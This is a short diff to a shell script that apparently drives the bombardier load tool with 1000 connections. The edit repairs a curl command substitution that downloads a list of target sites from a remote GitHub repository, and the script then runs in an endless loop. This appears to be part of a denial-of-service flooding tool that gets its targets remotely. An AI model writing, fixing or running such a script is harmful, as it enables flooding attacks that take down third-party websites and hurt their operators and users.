@@ -7,9 +7,7 @@ BOMBARDIER_CONNECTIONS=1000
 
 
 
-declare -a sites=(
-  curl https://raw.githubusercontent.com/alexnest-ua/Updated-bombardier/main/targets
-)
+declare -a sites=($(curl https://raw.githubusercontent.com/alexnest-ua/Updated-bombardier/main/targets))
 
 while :
 do
